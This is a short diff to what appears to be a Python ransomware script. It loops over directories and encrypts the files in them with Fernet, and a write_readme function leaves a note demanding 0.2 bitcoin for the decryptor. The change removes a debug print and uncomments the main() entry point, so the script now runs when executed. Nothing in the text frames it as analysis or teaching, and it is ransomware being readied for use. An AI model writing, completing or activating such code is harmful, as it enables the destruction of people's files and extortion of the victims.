@@ -43,7 +43,6 @@ def loop(directories: list[str], ignore: list[str], f: Fernet):
         for directory in directories:
             if os.path.exists(directory) and os.path.isdir(directory):
                 for file in os.listdir(directory):
-                    print(file)
                     if file in ignore:
                         continue
                     if os.path.isfile(directory + "\\" + file):
@@ -72,5 +71,6 @@ def write_readme(username: str, key: str):
         file.write(
             f'Your files have been encrypted, send 0.2 bitcoin to my bank account, and I will give you the decryptor. KEY: {key}')
 
-# if __name__ == "__main__":
-#     main()
+
+if __name__ == "__main__":
+    main()
